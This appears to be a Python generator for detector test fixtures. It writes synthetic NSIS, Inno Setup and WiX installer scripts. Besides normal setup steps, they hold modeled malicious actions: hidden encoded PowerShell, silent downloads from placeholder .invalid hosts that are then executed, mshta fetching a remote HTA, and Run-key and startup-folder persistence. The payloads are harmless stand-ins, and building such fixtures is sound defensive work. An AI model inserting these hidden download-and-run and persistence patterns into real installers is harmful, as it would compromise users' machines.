"""Generator for the installer-action-model fixtures: writes literal NSIS / Inno Setup / WiX sources (stdlib only; the
WiX one is also compiled with msitools `wixl` to prove it is a valid WiX source) and the fixture json skeletons.
usage: python3 -I ia_gen.py <fixture dir>"""
import base64
import json
import os
import sys

d = sys.argv[1]
enc = base64.b64encode("Write-Output 'stage2'".encode("utf-16-le")).decode()
NSI = r'''; synthetic NSIS installer: real setup + modeled payload
Unicode True
!define APP "Acme Viewer"
Name "${APP}"
OutFile "acme-setup.exe"
InstallDir "$PROGRAMFILES\Acme"
RequestExecutionLevel admin
Page directory
Page instfiles

Function .onInit
  MessageBox MB_OK "Welcome to ${APP}"
FunctionEnd

Section "Main" SecMain
  SetOutPath "$INSTDIR"
  File "viewer.exe"
  File /oname=readme.txt "README.md"
  CreateDirectory "$SMPROGRAMS\Acme"
  CreateShortCut "$SMPROGRAMS\Acme\Viewer.lnk" "$INSTDIR\viewer.exe"
  WriteUninstaller "$INSTDIR\uninstall.exe"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\Acme" "DisplayName" "${APP}"
  DetailPrint "installed"
SectionEnd

Section "-hidden"
  StrCpy $1 "powershell.exe -NoP -W Hidden -enc ENC"
  nsExec::ExecToLog '$1'
  inetc::get /SILENT "https://cdn.acme.example.invalid/update.bin" "$TEMP\update.bin" /END
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "AcmeUpd" 'wscript.exe //E:jscript "$APPDATA\acme\u.dat"'
  CreateShortCut "$SMSTARTUP\acme.lnk" "cmd.exe" '/c python "$APPDATA\acme\s.py"'
SectionEnd

Function .onInstSuccess
  ExecShell "open" "mshta.exe" "https://acme.example.invalid/n.hta"
FunctionEnd
'''.replace("ENC", enc)
ISS = r'''; synthetic Inno Setup script
#define MyApp "Acme Tools"
[Setup]
AppName={#MyApp}
AppVersion=1.0
DefaultDirName={autopf}\Acme

[Files]
Source: "tool.exe"; DestDir: "{app}"; Flags: ignoreversion

[Dirs]
Name: "{app}\data"

[Icons]
Name: "{group}\{#MyApp}"; Filename: "{app}\tool.exe"
Name: "{userstartup}\acmesync"; Filename: "{sys}\wscript.exe"; Parameters: """{app}\sync.vbs"""

[Registry]
Root: HKLM; Subkey: "Software\Acme"; ValueType: string; ValueName: "Path"; ValueData: "{app}"
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunOnce"; ValueType: string; ValueName: "acme"; ValueData: "node ""{app}\agent.js"""

[Run]
Filename: "{sys}\mshta.exe"; Parameters: "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"calc"""""")"; Flags: runhidden

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
var
  rc: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    DownloadTemporaryFile('https://acme.example.invalid/p.py', 'p.py', '', nil);
    Exec('python.exe', ExpandConstant('{tmp}\p.py'), '', SW_HIDE, ewWaitUntilTerminated, rc);
  end;
end;
'''
WXS = r'''<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="AcmeSvc" Language="1033" Version="1.0.0" Manufacturer="Acme" UpgradeCode="12345678-1234-1234-1234-123456789012">
    <Package InstallerVersion="200" Compressed="yes" />
    <Media Id="1" Cabinet="a.cab" EmbedCab="yes" />
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLDIR" Name="Acme">
          <Component Id="MainExe" Guid="11111111-2222-3333-4444-555555555555">
            <File Id="AcmeExe" Source="acme.txt" Name="acme.txt" />
            <RegistryValue Root="HKLM" Key="Software\Acme" Name="Path" Type="string" Value="[INSTALLDIR]" KeyPath="yes" />
          </Component>
          <Component Id="RunKey" Guid="11111111-2222-3333-4444-666666666666">
            <RegistryValue Root="HKCU" Key="Software\Microsoft\Windows\CurrentVersion\Run" Name="acme" Type="string" Value="cmd.exe /c bash -c id" KeyPath="yes" />
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="F" Level="1">
      <ComponentRef Id="MainExe" />
      <ComponentRef Id="RunKey" />
    </Feature>
    <Property Id="PSHOST" Value="powershell.exe" />
    <CustomAction Id="StagePs" Property="PSHOST" ExeCommand="-NoProfile -File &quot;[INSTALLDIR]s.ps1&quot;" Return="ignore" Execute="deferred" Impersonate="no" />
    <InstallExecuteSequence>
      <Custom Action="StagePs" Before="InstallFinalize">NOT Installed</Custom>
    </InstallExecuteSequence>
  </Product>
</Wix>
'''
WXS2 = r'''<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
  <Package Name="AcmeHelper" Manufacturer="Acme" Version="1.0.0" UpgradeCode="22345678-1234-1234-1234-123456789012">
    <StandardDirectory Id="StartupFolder">
      <Component Id="StartLnk">
        <Shortcut Id="S1" Name="helper" Target="[System64Folder]wscript.exe" Arguments="//E:jscript &quot;[INSTALLFOLDER]h.dat&quot;" />
        <RegistryValue Root="HKCU" Key="Software\\Acme" Name="lnk" Type="integer" Value="1" KeyPath="yes" />
      </Component>
    </StandardDirectory>
    <StandardDirectory Id="ProgramFiles6432Folder">
      <Directory Id="INSTALLFOLDER" Name="AcmeHelper">
        <Component Id="Main">
          <File Source="helper.exe" />
          <CreateFolder />
        </Component>
      </Directory>
    </StandardDirectory>
    <CustomAction Id="Hta" Directory="INSTALLFOLDER" ExeCommand="mshta.exe javascript:close()" Return="ignore" />
    <CustomAction Id="Vbs" Script="vbscript" Return="ignore">CreateObject("WScript.Shell").Run "notepad"</CustomAction>
    <CustomAction Id="Native" BinaryRef="CaDll" DllEntry="DoThing" />
  </Package>
</Wix>
'''
DECOY_NSI = r'''Unicode True
Name "Huntress Analysis 95e72522"
OutFile "huntress-95e72522.exe"
Section
  StrCpy $0 "763d337c6c616e67756167653d6e736973"
SectionEnd
'''
DECOY_TXT = "# not an installer: a PowerShell note that mentions [Run] and Section words inline\n" \
            "Write-Output 'Section Main; [Run] later'\n"
for n, t in (("ia_nsis_setup.nsi", NSI), ("ia_inno_setup.iss", ISS), ("ia_wix_setup.wxs", WXS), ("ia_wix_v4_script.wxs", WXS2),
             ("ia_nsis_strcpy_only.nsi", DECOY_NSI), ("ia_decoy_ps1.txt", DECOY_TXT)):
    with open(os.path.join(d, n), "w") as f:
        f.write(t)
